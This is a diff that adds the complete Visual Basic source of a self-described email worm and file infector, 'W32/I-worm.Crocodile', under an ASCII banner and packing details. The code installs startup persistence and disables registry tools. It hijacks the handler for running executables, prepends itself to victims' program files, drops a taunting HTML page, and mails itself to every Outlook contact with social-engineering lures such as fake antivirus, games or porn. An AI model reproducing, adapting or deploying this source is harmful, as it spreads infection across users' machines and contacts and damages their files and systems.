@@ -1,0 +1,339 @@
+
+ллллллллллл
+ллл        л
+ллл         л
+ллл         л ллллллл  ллл   ллл  ллллллл ллл       лллл  ллл      лллл   ллллл   ллл  ллллл
+ллл        л ллл  ллл  ллл   ллл ллл      ллл      ллл  л  лл     ллл  л ллл   лл ллл ллл   л
+ллллллллллл  ллл       ллл   ллл ллл      ллл      ллл  л  лл     ллл  л ллл   лл     ллл
+ллл           ллллллл   ллллллл  ллл      ллл ллл  ллл  л  лл     ллл  л ллл   лл ллл ллл
+ллл                ллл    ллл    ллл      лллл   л ллл  л  лл     ллл  л ллл   лл ллл ллл
+ллл           ллл  ллл    ллл    ллл      ллл    л ллл  л  лл     ллл  л ллл   лл ллл ллл   л
+лллл          ллллллл     ллл     ллллллл ллл    л  лллл   лллллл  лллл   ллллллл ллл  ллллл
+                                                                               лл
+                                                                   лл  лллл    лл
+                                                                  л  лл    ллллл
+
+ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
+W32.I-worm.Hllp.vb.Crocodile
+ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
+Auth		: Psychologic
+Compression	: Upx 1.24
+Org file size	: 60.154
+Compressed	: 17.408
+Encrypted	: Yes Simple Host Encryption
+ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ
+
+Crocodile is W32 virus that made in vb and compressed with Upx 1.24, Encrypted host with very
+simple replacing binnary number in host code, droping html file for message on victim machine
+and changes some registry var.Worming with outlook with random body message.
+
+**********************************************************************************************
+' W32/I-worm.Crocodile
+' By Psychologic
+' Well, The Crocodile is still a live
+' Created 7/2/03
+
+Private WinDir As String
+Private VirusPath As String
+Private VirusFile As String
+Private VirusCode As String
+Private VictimCode As String
+Private Victim As String
+Private CheckVirusMarker As String
+Private VirusMarker As String
+Private HostLength As Long
+Private HostCode As String
+Private VirusInstalled As String
+Private InstallFile As String
+
+Const VirusSize As Integer = 17408
+Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
+Option Explicit
+Private Type STARTUPINFO
+    cb As Long
+    lpReserved As String
+    lpDesktop As String
+    lpTitle As String
+    dwX As Long
+    dwY As Long
+    dwXSize As Long
+    dwYSize As Long
+    dwXCountChars As Long
+    dwYCountChars As Long
+    dwFillAttribute As Long
+    dwFlags As Long
+    wShowWindow As Integer
+    cbReserved2 As Integer
+    lpReserved2 As Long
+    hStdInput As Long
+    hStdOutput As Long
+    hStdError As Long
+End Type
+Private Type PROCESS_INFORMATION
+    hProcess As Long
+    hThread As Long
+    dwProcessID As Long
+    dwThreadID As Long
+End Type
+Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
+Private Declare Function CreateProcessA Lib "kernel32" (ByVal _
+    lpApplicationName As Long, ByVal lpCommandLine As String, ByVal _
+    lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, _
+    ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, _
+    ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, _
+    lpStartupInfo As STARTUPINFO, lpProcessInformation As _
+    PROCESS_INFORMATION) As Long
+Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
+Private Const NORMAL_PRIORITY_CLASS = &H20&
+Private Const INFINITE = -1&
+
+Public Sub ExecCmd(cmdline$)
+    Dim proc As PROCESS_INFORMATION
+    Dim start As STARTUPINFO
+    Dim ReturnValue As Integer
+    start.cb = Len(start)
+    ReturnValue = CreateProcessA(0&, cmdline$, 0&, 0&, 1&, NORMAL_PRIORITY_CLASS, 0&, 0&, start, proc)
+    Do
+    ReturnValue = WaitForSingleObject(proc.hProcess, 0)
+    DoEvents
+    Loop Until ReturnValue <> 258
+    ReturnValue = CloseHandle(proc.hProcess)
+End Sub
+
+Private Sub Form_Load()
+On Error Resume Next
+Dim fso, ws, real, gam
+Set fso = CreateObject("scripting.filesystemobject")
+If Not fso.FileExists("C:\windows\system\croco.html") Then
+Open "C:\windows\system\croco.html" For Output As #1
+Print #1, "<HTML><HEAD><TITLE>Crocodile</TITLE><SCRIPT LANGUAGE=" & Chr(34) & "JavaScript" & Chr(34) & ">"
+Print #1, "<!-- Begin"
+Print #1, "var matrix_window;"
+Print #1, "function MatrixWrite(string, bold, italic, speed) {"
+Print #1, "var height = window.screen.height;"
+Print #1, "var width = window.screen.width;"
+Print #1, "var win_dimensions = " & Chr(34) & "height = " & Chr(34) & " + eval(height + 10) + " & Chr(34) & ", width = " & Chr(34) & " + eval(width + 30);"
+Print #1, "matrix_window = window.open(" & Chr(34) & "blank.htm" & Chr(34) & ", " & Chr(34) & "matrix_window" & Chr(34) & ", win_dimensions);"
+Print #1, "matrix_window.document.open(" & Chr(34) & "text/html" & Chr(34) & ", " & Chr(34) & "replace" & Chr(34) & ");"
+Print #1, "var i;"
+Print #1, "var timer = 0;"
+Print #1, "if(matrix_window.moveTo)"
+Print #1, "matrix_window.moveTo(-10, -30);"
+Print #1, "if(matrix_window.resizeBy)"
+Print #1, "matrix_window.resizeBy(0, 50);"
+Print #1, "matrix_window.document.write(" & Chr(34) & "<body bgcolor=000000 text=00ff00 onBlur='self.focus()'>" & Chr(34) & ");"
+Print #1, "matrix_window.document.write(" & Chr(34) & "<font face=system>" & Chr(34) & ");"
+Print #1, "if(bold == true) matrix_window.document.write(" & Chr(34) & "<b>" & Chr(34) & ");"
+Print #1, "if(italic == true) matrix_window.document.write(" & Chr(34) & "<i>" & Chr(34) & ");"
+Print #1, "for(i = 0; i <= string.length; i++) {"
+Print #1, "timer += (Math.random() * speed);"
+Print #1, "setTimeout(" & Chr(34) & "matrix_window.document.write('" & Chr(34) & " + string.charAt(i) + " & Chr(34) & "');" & Chr(34) & ", timer);"
+Print #1, "}"
+Print #1, "timer += 2000;"
+Print #1, "setTimeout(" & Chr(34) & "matrix_window.close()" & Chr(34) & ", timer);"
+Print #1, "}"
+Print #1, "<!-- Begin"
+Print #1, "var matrix_window;"
+Print #1, "function MatrixWrite(string, bold, italic, speed) {"
+Print #1, "var height = window.screen.height;"
+Print #1, "var width = window.screen.width;"
+Print #1, "var win_dimensions = " & Chr(34) & "height = " & Chr(34) & " + eval(height + 10) + " & Chr(34) & ", width = " & Chr(34) & " + eval(width + 30);"
+Print #1, "matrix_window = window.open(" & Chr(34) & "blank.htm" & Chr(34) & ", " & Chr(34) & "matrix_window" & Chr(34) & ", win_dimensions);"
+Print #1, "matrix_window.document.open(" & Chr(34) & "text/html" & Chr(34) & ", " & Chr(34) & "replace" & Chr(34) & ");"
+Print #1, "var i;"
+Print #1, "var timer = 0;"
+Print #1, "if(matrix_window.moveTo)"
+Print #1, "matrix_window.moveTo(-10, -30);"
+Print #1, "if(matrix_window.resizeBy)"
+Print #1, "matrix_window.resizeBy(0, 50);"
+Print #1, "matrix_window.document.write(" & Chr(34) & "<body bgcolor=000000 text=00ff00 onBlur='self.focus()'>" & Chr(34) & ");"
+Print #1, "matrix_window.document.write(" & Chr(34) & "<font face=system>" & Chr(34) & ");"
+Print #1, "if(bold == true) matrix_window.document.write(" & Chr(34) & "<b>" & Chr(34) & ");"
+Print #1, "if(italic == true) matrix_window.document.write(" & Chr(34) & "<i>" & Chr(34) & ");"
+Print #1, "for(i = 0; i <= string.length; i++) {"
+Print #1, "timer += (Math.random() * speed);"
+Print #1, "setTimeout(" & Chr(34) & "matrix_window.document.write('" & Chr(34) & " + string.charAt(i) + " & Chr(34) & "');" & Chr(34) & ", timer);"
+Print #1, "}"
+Print #1, "timer += 2000;"
+Print #1, "setTimeout(" & Chr(34) & "matrix_window.close()" & Chr(34) & ", timer);"
+Print #1, "}"
+Print #1, "var messages = new Array(" & Chr(34) & "Hellow Mister...!!<br>How Are You ??<br>This is <font color=red>W32.hllp exe prepender Crocodile</font><br> which created by Psychologic<br>I've been here since a month a go<br>and now I just want to tell you something<br>This is a real virus heheheh :)" & Chr(34) & "," & Chr(34) & "This is virus that Called it self Crocodile<br> And made by someone who call his self Psychologic<br>Hurry up update your new Anti virus" & Chr(34) & ");"
+Print #1, "function GetRndIndex() {"
+Print #1, "return (parseInt(Math.random() * messages.length));"
+Print #1, "}"
+Print #1, "function WriteRndMsg(bold, italic, speed) {"
+Print #1, "MatrixWrite(messages[GetRndIndex()], bold, italic, speed);"
+Print #1, "}"
+Print #1, "//-->"
+Print #1, "function GetRndIndex() {"
+Print #1, "return (parseInt(Math.random() * messages.length));"
+Print #1, "}"
+Print #1, "function WriteRndMsg(bold, italic, speed) {"
+Print #1, "MatrixWrite(messages[GetRndIndex()], bold, italic, speed);"
+Print #1, "}"
+Print #1, "//-->"
+Print #1, "</script>"
+Print #1, "</HEAD>"
+Print #1, "<BODY Onload = " & Chr(34) & "javascript:WriteRndMsg(true, true, 750)" & Chr(34) & ">"
+Print #1, "<p><b>Crocodile By Psychologic</b></p>"
+Print #1, "</body></html>"
+End If
+Set ws = CreateObject("WScript.Shell")
+gam = "C:\windows\system\croco.html"
+ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Crocodile", gam
+ws.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
+ws.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
+ws.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Psychologic"
+Dim FFile
+FFile = FreeFile
+App.TaskVisible = False
+Call RegisterServiceProcess(0, 1)
+VirusMarker = "Croco"
+WinDir = Environ("windir")
+If Right(WinDir, 1) <> "\" Then WinDir = WinDir & "\"
+VirusPath = App.Path
+If Right(VirusPath, 1) <> "\" Then VirusPath = VirusPath & "\"
+VirusFile = App.EXEName & ".exe"
+Dim CheckPayload As Integer
+Randomize
+CheckPayload = Int(Rnd * 10)
+If CheckPayload = 3 Or CheckPayload = 10 Then Call Payload
+InstallFile = WinDir & "Crocodile.exe"
+VirusInstalled = Dir(InstallFile, vbSystem + vbHidden)
+If VirusInstalled = "" Then
+    FileCopy VirusPath & VirusFile, InstallFile
+    SetAttr InstallFile, vbSystem + vbHidden
+    Dim Wshs
+    Set Wshs = CreateObject("WScript.Shell")
+    Wshs.regwrite "HKEY_CLASSES_ROOT\exefile\shell\open\command\", InstallFile & " " & "%1 %*"
+End If
+If VirusFile = "Crocodile.exe" Then
+    ExecCmd Command
+        Victim = Replace(Command, """", "")
+        Victim = GetFile(CStr(Victim))
+        
+        Open Victim For Binary Access Read As #FFile
+            VictimCode = Space(LOF(FFile))
+            Get #1, 1, VictimCode
+        Close #FFile
+        
+       CheckVirusMarker = Right(VictimCode, 5)
+       
+       If CheckVirusMarker <> VirusMarker Then
+
+            Open VirusPath & VirusFile For Binary Access Read As #FFile
+                VirusCode = Space$(VirusSize)
+                Get #1, 1, VirusCode
+            Close #FFile
+
+            Open Victim For Binary Access Write As #FFile
+                Put #FFile, 1, VirusCode
+                Put #FFile, VirusSize, VictimCode
+                Put #FFile, LOF(FFile) + 2, VirusMarker
+            Close #FFile
+            
+        End If
+
+Else
+
+    Open VirusPath & VirusFile For Binary Access Read As #FFile
+        HostLength = (LOF(FFile) - VirusSize)
+        If HostLength > 0 Then HostCode = Space(HostLength)
+        Get #FFile, VirusSize, HostCode
+    Close #FFile
+
+    Open VirusPath & App.EXEName & ".Croco" For Binary Access Write As #FFile
+         Put #FFile, , HostCode
+    Close #FFile
+
+    ExecCmd VirusPath & App.EXEName & ".Croco" & " " & Command
+
+    Kill (VirusPath & App.EXEName & ".Croco")
+    End
+End If
+Dim avty47g, b098uei, d000987j, fty678uy, guuythp, mes1, mes2, mes3, mes4, mes5, armen1, armen2
+mes1 = "Hi ..."
+mes1 = mes1 & vbCrLf & "This is free software that I got from"
+mes1 = mes1 & vbCrLf & "My new AntiVirus, This is very good software"
+mes1 = mes1 & vbCrLf & "It can protect every virus in the world"
+mes1 = mes1 & vbCrLf & "Just Checkout the attachment"
+
+mes2 = "Hi ..."
+mes2 = mes2 & vbCrLf & "I have new game for you"
+mes2 = mes2 & vbCrLf & "I call its Crocodile"
+mes2 = mes2 & vbCrLf & "Maybe Now you get bored with ypur Counter strike"
+mes2 = mes2 & vbCrLf & "Its new game and never released before, just check the attachment"
+
+mes3 = "Hi ..."
+mes3 = mes3 & vbCrLf & "I now you bored with your Winamp"
+mes3 = mes3 & vbCrLf & "See here, This is new and Cool mp3 player"
+mes3 = mes3 & vbCrLf & "Look at the attachment, and install it"
+mes3 = mes3 & vbCrLf & "I sweer It cool..!!"
+
+mes4 = "Warning :"
+mes4 = mes4 & vbCrLf & "WARNING :"
+mes4 = mes4 & vbCrLf & "Too many virus is out there"
+mes4 = mes4 & vbCrLf & "This is free AntiVirus Product"
+mes4 = mes4 & vbCrLf & "Try it"
+
+mes5 = "Porn movie"
+mes5 = mes5 & vbCrLf & "Heyyy"
+mes5 = mes5 & vbCrLf & "Do you wanna see very Hot Asian porn movie ?"
+mes5 = mes5 & vbCrLf & "Just checkout this file "
+mes5 = mes5 & vbCrLf & "its free"
+
+armen1 = Array(mes1, mes2, mes3, mes4)
+armen2 = armen2(Int(Rnd * 5 + 1))
+
+Set avty47g = CreateObject("Outlook.Application")
+   Set b098uei = avty47g.getnamespace("MAPI")
+   If avty47g = "Outlook" Then
+    b098uei.Logon "profile", "password"
+    For fty678uy = 1 To b098uei.addresslists.Count
+    For d000987j = 1 To b098uei.addresslists(fty678uy).addressentries.Count
+        With avty47g.createitem(100 - 100)
+        Set guuythp = b098uei.addresslists(fty678uy).addressentries(d000987j)
+        .Recipients.Add guuythp
+        .Subject = "Hey you there..!!"
+        .body = armen2
+        .Attachments.Add WinDir + "Crocodile.exe"
+        .send
+        End With
+        guuythp = ""
+    Next d000987j
+    Next fty678uy
+    b098uei.logoff
+    End If
+End Sub
+
+Private Function Replace(Expresion As String, StrFind As String, StrReplace As String) As String
+On Error Resume Next
+Dim i As Long
+For i = 1 To Len(Expresion)
+    If Mid(Expresion, i, 1) Like StrFind Then Expresion = Mid(Expresion, 1, i - 1) & StrReplace & Mid(Expresion, i + 1)
+Next i
+    Replace = Expresion
+End Function
+
+Private Function GetFile(strFilePath As String) As String
+    On Error GoTo ErrTrap
+    Dim i As Long
+    For i = 1 To Len(strFilePath)
+        If Dir(Mid(strFilePath, 1, i)) <> "" Then
+            GetFile = Mid(strFilePath, 1, i)
+        If Dir(GetFile) <> "" And Right(GetFile, 1) <> "\" And Right(GetFile, 1) <> ":" Then Exit For
+        End If
+    Next
+    Exit Function
+ErrTrap:
+    GetFile = ""
+End Function
+
+Private Sub Payload()
+    On Error Resume Next
+    MsgBox "W32/I-WORM.CROCODILE By Psychologic", vbInformation, "W32/I-worm.Crocodile"
+    Dim w
+    Set w = CreateObject("wscript.shell")
+    w.run "start C:\windows\system\croco.html"
+    End Sub
+**********************************************************************************************
